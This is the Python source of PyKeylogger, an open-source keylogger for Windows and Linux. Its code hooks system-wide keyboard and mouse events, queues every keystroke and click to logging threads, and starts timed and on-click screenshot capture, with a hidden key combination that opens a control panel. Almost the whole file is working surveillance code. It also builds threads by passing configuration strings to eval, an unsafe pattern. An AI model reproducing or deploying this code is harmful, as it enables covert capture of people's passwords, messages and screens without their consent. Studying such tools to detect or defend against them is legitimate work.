# !/usr/bin/env python
# -*- coding: utf-8 -*-

##############################################################################
#
# PyKeylogger: Simple Python Keylogger for Windows
# Copyright (C) 2009  nanotube@users.sf.net
#
# http://pykeylogger.sourceforge.net/
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# 2015 modifications by Roxana Lafuente <roxana.lafuente@gmail.com>
##############################################################################

import os
import os.path
import time
import sys
if os.name == 'posix':
    import pyxhook as hooklib
elif os.name == 'nt':
    import pyHook as hooklib
    import pythoncom
else:
    print ("El SO no se reconoce como Linux o Windows")
    exit()

import re
from optparse import OptionParser
import traceback
import version
from configobj import ConfigObj, flatten_errors
from validate import Validator
from controlpanel import PyKeyloggerControlPanel
from supportscreen import SupportScreen, ExpirationScreen
import Tkinter
import tkMessageBox
import myutils
from Queue import Empty, Queue
import threading
import logging
from myutils import _settings, _cmdoptions, _mainapp, get_username

# event processing threads
from detailedlogwriter import DetailedLogWriterFirstStage
from onclickimagecapture import OnClickImageCaptureFirstStage
from timedscreenshot import TimedScreenshotFirstStage

from constants import KUP, KDOWN, SYSLOG, EXTENSION


class KeyLogger:
    '''
        Captures all keystrokes, enqueue events.

        Puts keystrokes events in queue for later processing by the LogWriter
        class.
    '''

    def __init__(self, username):
        self.username = username
        self.parse_options()  # Stored in self.cmdoptions
        self.parse_config_file()  # Stored in self.settings
        baselogdir = self.settings['General']['Log Directory']
        # Timestamp for the creation of log directories.
        self.logdir = baselogdir + '-' + self.username + '-'
        self.logdir += str(int(time.time()))
        self.parse_control_key()
        self.process_settings()
        _settings['settings'] = self.settings
        _cmdoptions['cmdoptions'] = self.cmdoptions
        _mainapp['mainapp'] = self

        ldir = self.logdir
        self.create_log_directory(ldir)
        os.chdir(ldir)
        self.create_loggers()
        self.spawn_event_threads()

        if os.name == 'posix':
            self.hashchecker = ControlKeyMonitor(self, self.ControlKeyHash)
        self.hm = hooklib.HookManager()

        if self.settings['General']['Hook Keyboard'] is True:
            self.hm.HookKeyboard()
            self.hm.KeyDown = self.OnKeyDownEvent
            self.hm.KeyUp = self.OnKeyUpEvent

        if self.settings['General']['Hook Mouse'] is True:
            self.hm.HookMouse()
            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
            self.hm.MouseAllButtonsUp = self.OnMouseUpEvent

        self.panel = False

    def spawn_event_threads(self):
        self.event_threads = {}
        self.queues = {}
        self.logger.debug(self.settings.sections)
        # This is done in order to avoid raising the exception KeyError.
        sectionssettings = self.settings.sections
        sectionssettings.remove('General')
        for section in sectionssettings:
            try:
                threadname = self.settings[section]['General']['_Thread_Class']
                self.queues[section] = Queue(0)
                self.event_threads[section] = eval(self.settings[section]['General']['_Thread_Class'] + '(self.username, self.queues[section], section)')
            except AttributeError:
                msg = 'AttributeError caught at spawn_event_threads: %s'
                self.logger.debug(msg % section)
            except NameError:
                # NameError occurs because TimedScreenShot is not imported.
                msg = 'NameError caught at spawn_event_threads: %s'
                self.logger.debug(msg % section)

    def start(self):
        for key in self.event_threads.keys():
            if self.settings[key]['General']['Enable ' + key]:
                self.logger.debug('Starting thread %s: %s' % (key, self.event_threads[key]))
                self.event_threads[key].start()
            else:
                self.logger.debug('Not starting thread %s: %s' % (key, self.event_threads[key]))

        if os.name == 'nt':
            pythoncom.PumpMessages()
            # Pumps all messages for the current thread until a WM_QUIT msg.
        elif os.name == 'posix':
            self.hashchecker.start()
            self.hm.start()

    def process_settings(self):
        '''
            Sanitizes user input and detects full path of the log directory.

            We can change things in the settings configobj with impunity here,
            since the control panel process get a fresh read of settings from
            file before doing anything.

        '''
        log_dir = os.path.normpath(self.logdir)
        if os.path.isabs(log_dir):
            self.settings['General']['Log Directory'] = log_dir
        else:
            self.settings['General']['Log Directory'] = \
                os.path.join(myutils.get_main_dir(), log_dir)

        # Regexp filter for the non-allowed characters in windows filenames.
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")

        self.settings['General']['System Log'] = \
            self.filter.sub(r'__', self.settings['General']['System Log'])

    def create_log_directory(self, logdir):
        '''
            Make sure we have the directory where we want to log
        '''
        try:
            os.makedirs(logdir)
        except OSError, detail:
            # If directory already exists, swallow the error.
            if(detail.errno == 17):
                pass
            else:
                logging.getLogger('').error("error creating log directory",
                                            exc_info=True)
        except:
            logging.getLogger('').error("error creating log directory",
                                        exc_info=True)

    def parse_control_key(self):
        self.ControlKeyHash = \
            ControlKeyHash(self.settings['General']['Control Key'])

    def create_loggers(self):

        # configure default root logger to log all debug messages to stdout
        if self.cmdoptions.debug:
            loglevel = logging.DEBUG
        else:
            loglevel = logging.CRITICAL

        logformatter = logging.Formatter("%(asctime)s %(name)-25s "
                                         "%(levelname)-10s %(filename)-25s "
                                         "%(lineno)-5d %(funcName)s "
                                         "%(message)s")
        rootlogger = logging.getLogger('')
        rootlogger.setLevel(logging.DEBUG)
        consolehandler = logging.StreamHandler(sys.stdout)
        consolehandler.setLevel(loglevel)
        consolehandler.setFormatter(logformatter)
        rootlogger.addHandler(consolehandler)

        # configure the "systemlog" handler to log all debug messages to file
        if self.settings['General']['System Log'] != 'None':
            syslogpath = os.path.join(self.settings['General']['System Log'],
                                      SYSLOG + '_' + self.username + EXTENSION)
            os.mkdir(self.settings['General']['System Log'])
            systemloghandler = logging.FileHandler(syslogpath)
            systemloghandler.setLevel(logging.DEBUG)
            systemloghandler.setFormatter(logformatter)
            rootlogger.addHandler(systemloghandler)

        self.logger = rootlogger

    def push_event_to_queues(self, event):
        for key in self.queues.keys():
            self.logger.debug('Sticking event into queue %s' % key)
            self.queues[key].put(event)

    def OnKeyDownEvent(self, event):
        '''
            Called when a key is pressed.

            Puts the event in queue, updates the control key combo status, and
            passes the event on to the system.
        '''
        self.push_event_to_queues(event)

        self.ControlKeyHash.update(event)

        if self.cmdoptions.debug:
            logging.getLogger('').debug("control key status: " + str(self.ControlKeyHash))
        # We have to open the panel from main thread on windows, otherwise it
        # hangs. This is possibly due to some interaction with the python
        # message pump and tkinter.
        # On linux, on the other hand, doing it from a separate worker thread
        # is a must since the pyxhook module blocks until panel is closed,
        # so we do it with the hashchecker thread instead.
        if os.name == 'nt':
            if self.ControlKeyHash.check():
                if not self.panel:
                    logging.getLogger('').debug("starting panel")
                    self.panel = True
                    self.ControlKeyHash.reset()
                    PyKeyloggerControlPanel()
        return True

    def OnKeyUpEvent(self, event):
        self.push_event_to_queues(event)

        self.ControlKeyHash.update(event)
        return True

    def OnMouseDownEvent(self, event):
        self.push_event_to_queues(event)
        return True

    def OnMouseUpEvent(self, event):
        self.push_event_to_queues(event)
        return True

    def stop(self):
        '''
            Exit cleanly.
        '''
        if os.name == 'posix':
            self.hm.cancel()

        for key in self.event_threads.keys():
            self.event_threads[key].cancel()

        logging.shutdown()
        time.sleep(0.2)  # give all threads time to clean up
        sys.exit()

    def parse_options(self):
        '''
            Read command line options.
        '''
        version_str = version.description + " version " + version.version + \
            " (" + version.url + ")."
        parser = OptionParser(version=version_str)
        parser.add_option("-d", "--debug",
                          action="store_true", dest="debug",
                          help="debug mode (print output to console instead of"
                          " the log file) "
                          "[default: %default]")
        parser.add_option("-c", "--configfile",
                          action="store", dest="configfile",
                          help="filename of the configuration ini file. "
                          "[default: %default]")
        parser.add_option("-v", "--configval",
                          action="store", dest="configval",
                          help="filename of the configuration validation file."
                          " [default: %default]")

        parser.set_defaults(debug=False,
                            configfile=version.name + ".ini",
                            configval=version.name + ".val")

        self.cmdoptions, args = parser.parse_args()

    def parse_config_file(self):
        '''
            Reads config file options from .ini file.

            Filename as specified by "--configfile" option,
            default "pykeylogger.ini".

            Validation file specified by "--configval" option,
            default "pykeylogger.val".

            Give detailed error box and exit if validation on the config file
            fails.

        '''

        if not os.path.isabs(self.cmdoptions.configfile):
            self.cmdoptions.configfile = os.path.join(
                myutils.get_main_dir(), self.cmdoptions.configfile)
        if not os.path.isabs(self.cmdoptions.configval):
            self.cmdoptions.configval = os.path.join(
                myutils.get_main_dir(), self.cmdoptions.configval)

        self.settings = ConfigObj(self.cmdoptions.configfile,
                                  configspec=self.cmdoptions.configval,
                                  list_values=False)

        # validate the config file
        errortext = ["Some of your input contains errors. "
                     "Detailed error output below.", ]

        val = Validator()
        val.functions['log_filename_check'] = myutils.validate_log_filename
        val.functions['image_filename_check'] = myutils.validate_image_filename
        valresult = self.settings.validate(val, preserve_errors=True)
        if valresult is not True:
            for section_list, key, error in flatten_errors(self.settings,
                                                           valresult):
                if key is not None:
                    section_list.append(key)
                else:
                    section_list.append('[missing section]')
                section_string = ','.join(section_list)
                if error is False:
                    error = 'Missing value or section.'
                errortext.append('%s: %s' % (section_string, error))
            tkMessageBox.showerror("Errors in config file. Exiting.",
                                   '\n\n'.join(errortext))
            sys.exit(1)


class ControlKeyHash:
    '''
        Encapsulates the control key dictionary.
        This dictionary is used to keep track of whether the control key combo
        has been pressed.
    '''
    def __init__(self, controlkeysetting):
        lin_win_dict = {'Alt_l': 'Lmenu',
                        'Alt_r': 'Rmenu',
                        'Control_l': 'Lcontrol',
                        'Control_r': 'Rcontrol',
                        'Shift_l': 'Lshift',
                        'Shift_r': 'Rshift',
                        'Super_l': 'Lwin',
                        'Super_r': 'Rwin',
                        'Page_up': 'Prior'}

        win_lin_dict = dict([(v, k) for (k, v) in lin_win_dict.iteritems()])

        self.controlKeyList = controlkeysetting.split(';')

        # Capitalize all items for greater tolerance of variant user inputs.
        self.controlKeyList = \
            [item.capitalize() for item in self.controlKeyList]
        # Remove duplicates.
        self.controlKeyList = list(set(self.controlKeyList))

        # Translate linux versions of key names to windows, or vice versa,
        # depending on what platform we are on.
        if os.name == 'nt':
            for item in self.controlKeyList:
                if item in lin_win_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = \
                        lin_win_dict[item]
        elif os.name == 'posix':
            for item in self.controlKeyList:
                if item in win_lin_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = \
                        lin_win_dict[item]

        self.controlKeyHash = dict(zip(
                                   self.controlKeyList,
                                   [False for item in self.controlKeyList]))

    def update(self, event):
        if os.name == 'posix':
            kd = 'key_down'
            ku = 'key_up'
        elif os.name == 'nt':
            kd = 'key down'
            ku = 'key up'
        if event.MessageName == kd and \
           event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = True
        if event.MessageName == ku and \
           event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = False


    def reset(self):
        for key in self.controlKeyHash.keys():
            self.controlKeyHash[key] = False

    def check(self):
        if self.controlKeyHash.values() == [True] * len(self.controlKeyHash):
            return True
        else:
            return False

    def __str__(self):
        return str(self.controlKeyHash)


class ControlKeyMonitor(threading.Thread):
    '''
        Polls the control key hash status periodically.

        Done to see if the control key combo has been pressed.
        Brings up control panel if it has.

    '''
    def __init__(self, mainapp, controlkeyhash):
        threading.Thread.__init__(self)
        self.finished = threading.Event()

        # panel flag - true if panel is up, false if not
        # this way we don't start a second panel instance when it's already up
        # self.panel=False

        self.mainapp = mainapp
        self.ControlKeyHash = controlkeyhash

    def run(self):
        while not self.finished.isSet():
            if self.ControlKeyHash.check():
                if not self.mainapp.panel:
                    self.mainapp.panel = True
                    self.ControlKeyHash.reset()
                    PyKeyloggerControlPanel()
            time.sleep(0.05)

    def cancel(self):
        self.finished.set()


if __name__ == '__main__':
    kl = KeyLogger(myutils.get_username())
    kl.start()

    # If you want to change keylogger behavior from defaults,
    # modify the .ini file. Also try '-h' for list of command line options.
